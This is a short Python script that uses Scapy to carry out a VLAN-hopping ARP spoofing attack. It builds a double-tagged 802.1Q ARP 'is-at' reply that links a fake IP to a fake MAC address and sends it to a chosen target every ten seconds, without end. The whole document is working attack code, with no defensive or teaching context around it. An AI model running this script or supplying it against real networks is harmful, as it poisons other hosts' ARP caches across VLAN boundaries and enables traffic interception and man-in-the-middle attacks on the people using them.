#!/usr/bin/python

import time
import sys
from scapy.all import sendp, ARP, Ether, Dot1Q


if len(sys.argv) < 7: 
	print "Missing arguments. Usage: " + sys.argv[0] + " <target_ip> <iface> <fake_ip> <fake_mac> <our_vlan> <target_vlan>"
	sys.exit(0)

packet = Ether() / \
		 Dot1Q(vlan=sys.argv[5]) / \
		 Dot1Q(vlan=sys.argv[6]) / \
		 ARP(hwsrc=sys.argv[4],
		 	 pdst=sys.argv[1],
		 	 psrc=sys.argv[3],
		 	 op="is-at")

while True:
	sendp(packet, iface=sys.argv[2])
	time.sleep(10)
